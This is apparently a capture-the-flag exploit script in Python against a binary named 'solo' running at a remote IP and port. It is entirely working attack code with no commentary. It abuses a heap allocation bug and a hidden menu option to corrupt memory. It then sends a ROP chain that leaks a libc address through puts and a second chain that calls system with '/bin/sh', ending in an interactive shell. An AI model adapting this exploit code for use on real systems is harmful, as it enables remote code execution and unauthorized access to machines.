import pwnbox,struct
pack = lambda x: struct.pack("<Q",x)
#p = pwnbox.pipe.ProcessPipe("./solo")
p = pwnbox.pipe.SocketPipe("52.175.144.148", 9901)
def malloc(i,size,data):
  p.read_until("$")
  p.write("1\n")
  p.read_until(":")
  p.write("%d\n"%i)
  p.read_until(":")
  p.write("%d\n"%size)
  p.read_until(":")
  p.write(data)


def free(i):
  p.read_until("$")
  p.write("2\n")
  p.read_until(":")
  p.write("%d\n"%i)
adr = 0x0602080

malloc(1,400,"A"*10+"\n")
malloc(2,500,"A"*10+"\n")
free(1)
p.read_until("$")
p.write("201527\n")
p.read_until(":")
p.write("A"*8+pack(adr-0x10)+"\n")
malloc(3,400,"A"*10+"\n")
p.write("4\n")
p.read_until(":")
pr = 0x400d13
puts_got = 0x602020
puts = 0x0400600
main_read = 0x040078B
rop = "A"*0x408
rop += pack(pr)
rop += pack(puts_got)
rop += pack(puts)
rop += pack(main_read)

p.write(rop+"\n")
p.read_until("$ ")
p.write("5\n\n")
libc_put = struct.unpack("<Q",p.read_byte(6)+"\x00"*2)[0]
libc = libc_put -0x6fd60
system = libc+0x46590
binsh = libc+0x017c8c3

rop = pack(pr+1)*(0x708/8)
rop += pack(pr)
rop += pack(binsh)
rop += pack(system)
p.write(rop+"\n")
p.read_until("$ ")
p.write("5\n")
p.interact()
